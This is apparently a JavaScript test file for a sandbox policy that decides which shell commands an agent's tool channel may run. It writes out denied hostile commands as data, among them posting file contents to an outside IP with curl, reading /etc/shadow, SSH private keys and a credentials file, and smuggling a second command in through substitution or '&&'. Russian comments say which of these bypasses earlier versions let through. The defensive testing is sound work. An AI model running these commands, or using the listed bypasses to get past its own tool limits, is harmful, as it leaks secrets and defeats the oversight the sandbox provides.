import test from 'node:test';
import assert from 'node:assert';

import { decideToolPolicy, policyForTask } from '../lib/toolpolicy.mjs';

const policy = policyForTask({ commandsAllowed: ['node --test tests/pricing.test.mjs'] });

test('task commands and read-only utilities are allowed', () => {
  assert.equal(decideToolPolicy('node --test tests/pricing.test.mjs', policy).allow, true);
  assert.equal(decideToolPolicy('ls -la', policy).allow, true);
  assert.equal(decideToolPolicy('git status --short', policy).allow, true);
  assert.equal(decideToolPolicy('git status && git diff', policy).allow, true);
});

test('the tool channel cannot reach the network or the host', () => {
  for (const command of [
    'curl -s http://1.1.1.1/',
    'wget http://example.com',
    'ssh user@host',
    'nc -l 9000',
    'docker ps',
    'npm install left-pad',
    'apt-get install curl',
    'sudo cat /etc/shadow',
  ]) {
    const decision = decideToolPolicy(command, policy);
    assert.equal(decision.allow, false, `${command} must be denied`);
    assert.match(decision.code, /TOOL_(COMMAND|PATH)/);
  }
});

test('command substitution, pipes into denied programs and redirection are denied', () => {
  assert.equal(decideToolPolicy('echo $(curl -s http://1.1.1.1/)', policy).allow, false);
  assert.equal(decideToolPolicy('cat file | curl -X POST -d @- http://1.1.1.1/', policy).allow, false);
  assert.equal(decideToolPolicy('ls > /tmp/leak', policy).allow, false);
  assert.equal(decideToolPolicy('cat `whoami`', policy).allow, false);
});

test('an empty or audit-only policy never silently allows a denied program', () => {
  assert.equal(decideToolPolicy('', policy).allow, false);
  assert.equal(decideToolPolicy('curl http://x', {}).allow, false);
  assert.equal(decideToolPolicy('curl http://x', { enforce: false }).allow, true);
});

test('absolute paths, home-relative paths and parent escapes are denied', () => {
  /* Это обходы, которые fix4 пропускал: путь важнее имени программы. */
  for (const command of [
    'cat /bin/bash',
    'cat /run/credentials/codex/auth.json',
    'node /usr/bin/env',
    'cat ~/.ssh/id_rsa',
    'cat ../outside/canary.txt',
    'node probes/../../etc/passwd',
  ]) {
    const decision = decideToolPolicy(command, policy);
    assert.equal(decision.allow, false, `${command} must be denied`);
    assert.equal(decision.code, 'TOOL_PATH_DENIED', `${command} must be denied as a path escape`);
  }
  assert.equal(decideToolPolicy('cat ./allowed.txt', policy).allow, true);
  assert.equal(decideToolPolicy('node probes/net.mjs 1.1.1.1 443', policy).allow, true);
});

/* fix6, п.7–8: синтаксические проверки и пути идут ДО allowlist, а allowlist
   сопоставляется точно. fix5 разрешал по префиксу, поэтому
   `node --test $(touch injected)` проходил как «команда задачи». */
test('substitution and path escapes are denied before any allowlist match', () => {
  assert.equal(decideToolPolicy('node --test $(touch injected)', policy).code, 'TOOL_SUBSTITUTION_DENIED');
  assert.equal(decideToolPolicy('node --test `touch injected`', policy).code, 'TOOL_SUBSTITUTION_DENIED');
  assert.equal(decideToolPolicy('node --test /absolute/path', policy).code, 'TOOL_PATH_DENIED');
  assert.equal(decideToolPolicy('node --test ../outside', policy).code, 'TOOL_PATH_DENIED');
  for (const command of [
    'node --test $(touch injected)',
    'node --test `touch injected`',
    'node --test /absolute/path',
    'node --test ../outside',
  ]) {
    assert.equal(decideToolPolicy(command, policy).allow, false, `${command} must be denied`);
  }
});

test('the task allowlist matches exactly, not by prefix', () => {
  const task = policyForTask({ commandsAllowed: ['mytool --check'] });
  assert.equal(decideToolPolicy('mytool --check', task).allow, true);
  const extended = decideToolPolicy('mytool --check --write', task);
  assert.equal(extended.allow, false);
  assert.equal(extended.code, 'TOOL_COMMAND_NOT_ALLOWED');
  /* Даже точное совпадение с allowlist не отменяет запрет команды: порядок
     «denied → allowlist» проверяется здесь, а не на префиксе. */
  const denied = decideToolPolicy('curl http://1.1.1.1/', policyForTask({ commandsAllowed: ['curl http://1.1.1.1/'] }));
  assert.equal(denied.allow, false);
  assert.equal(denied.code, 'TOOL_COMMAND_DENIED');
});

test('a task command cannot smuggle a second command', () => {
  const decision = decideToolPolicy('node --test tests/pricing.test.mjs && curl http://1.1.1.1/', policy);
  assert.equal(decision.allow, false);
  assert.equal(decision.code, 'TOOL_COMMAND_DENIED');
});
